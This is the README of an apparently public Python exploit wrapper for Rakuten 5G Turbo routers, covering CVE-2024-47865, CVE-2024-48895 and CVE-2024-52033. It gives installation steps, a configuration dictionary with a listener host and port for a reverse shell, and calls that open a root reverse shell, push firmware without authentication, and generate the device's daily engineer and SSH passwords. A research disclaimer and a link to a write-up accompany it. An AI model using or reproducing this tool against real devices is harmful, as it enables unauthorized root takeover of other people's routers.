
# Rakuten 5G Turbo - Exploit Wrapper API

## Overview

This repository provides a Python API to exploit known vulnerabilities on Rakuten 5G Turbo devices. These vulnerabilities include firmware downgrade without authentication, remote command execution, and information exposure. The project is intended for research purposes to demonstrate potential risks and improve security awareness.

<img src="https://neroteam.com/blog/pages/rakuten-5g-turbo-vulnerability/rakuten-5g-hacked.jpg?m=1722297533" alt="Rakuten 5G Turbo Exploit Wrapper API" width="600">

### CVEs Addressed:
- **[CVE-2024-47865]** - Missing Authentication for Critical Function
- **[CVE-2024-48895]** - OS Command Injection
- **[CVE-2024-52033]** - Exposure of Sensitive Information

## Prerequisites

- Python 3.x
- Required Python packages listed in `requirements.txt`

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/0xNslabs/Rakuten5GTurboAPI
    cd Rakuten5GTurboAPI
    ```

2. Install the dependencies:
    ```sh
    pip install requests cryptography
    ```

## Usage

### Configuration

Before running any exploit, update the `device` dictionary in `main.py` with the relevant details:

```python
device = {
    "turboIp": "192.168.210.1", # Device IP
    "turboUsername": "admin", # Device username
    "turboPassword": "admin", # Device password
    "host": "192.168.210.157", # Used for reverse shell CVE-2024-48895
    "port": "33666", # Used for reverse shell CVE-2024-48895
    "apn": "rakuten.jp", # Set new APN
    "fwImage": "GA2421@230920_1.3.14.ffw", # CVE-2024-47865
}
```

### Exploiting Vulnerabilities

#### 1. Missing Authentication for Firmware Downgrade (CVE-2024-47865)
Use the `execInstallFw` function to downgrade or install firmware without authentication:
```python
response = turboApi.execInstallFw(device)
print(response)
```

#### 2. Authenticated Remote Command Injection (CVE-2024-48895)
Use the `execRevrsShell` function to execute a reverse shell as root:
```python
response = turboApi.execRevrsShell(device)
print(response)
```

### Bonus Features
- **Generate Engineer Password**: Obtain full web access with `getEngineerPassword` 
- (Note: The password is automatically updated by the device everyday at midnight):
    ```python
    response = turboApi.getEngineerPassword(device)
    print(response)
    ```
- **Generate SSH Password**: Gain SSH access via debug firmware with `getSshPassword` (only working by installing debug firmware, e.g. DG2425@2406171559_DG1.3.18.ffw):
- (Note: The password is automatically updated by the device everyday at midnight):
    ```python
    response = turboApi.getSshPassword(device)
    print(response)
    ```
    
- **Direct APN Configuration**: Update the APN via `setDeviceApn`:
    ```python
    response = turboApi.setDeviceApn(device)
    print(response)
    ```

## Write-Up
https://neroteam.com/blog/rakuten-5g-turbo-vulnerability

## Video Proof of Concept
[![Script PoC CVE-2024-47865 remote code execution](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://youtu.be/tPDwhkLjL7s)

## Disclaimer

This software is provided for educational and research purposes only. Unauthorized access to or exploitation of computer systems is illegal and unethical. The authors and contributors of this software are not liable for any misuse or damages caused by its use.
